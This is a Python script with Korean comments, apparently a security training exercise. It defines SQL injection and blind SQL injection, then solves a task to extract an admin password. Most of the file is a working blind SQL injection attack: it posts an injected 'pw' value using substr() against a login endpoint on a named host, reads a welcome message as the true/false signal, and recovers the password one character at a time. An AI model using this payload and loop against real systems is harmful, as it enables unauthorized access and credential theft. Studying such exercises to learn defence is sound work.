# SQL Injection : 용자의 입력 중 db를 거치는 input에 SQL 구문을 넣어줌으로써 구문 자체를 제어하는 공격
# Blind SQL Injection : SQL Injection을 통해 query의 참과 거짓만을 알 수 있을 때, database에서 data를 얻어내는 공격
# [문제]
#  python으로 Blind SQL Injection script를 작성하여 admin의 비밀번호를 알아내세요.

# -*- coding: utf-8 -*-
import requests

password = ''

for idx in range(1, 33):
    for c in list(map(chr, range(97, 123))):
        param = {'id': 'admin', 'pw': "' or substr((select pw from user where id='admin')," + str(idx) + ",1)='"+c}
        res = requests.post('http://cykor.kr/sdsdsds', data=param)

        login_msg = bytes('환영합니다', 'utf-8')
        if res.content.find(login_msg) != -1:
            print('부분 문자열' + c)
            password += c
            break

print('admin password=' + password)


# 문자열을 list로 가져오는 방법
# r = range(ord('a'),...
# format 함수를 잘 사용하면, string concat을 하지 않더라도, 문자열을 쉽게 만들 수 있다.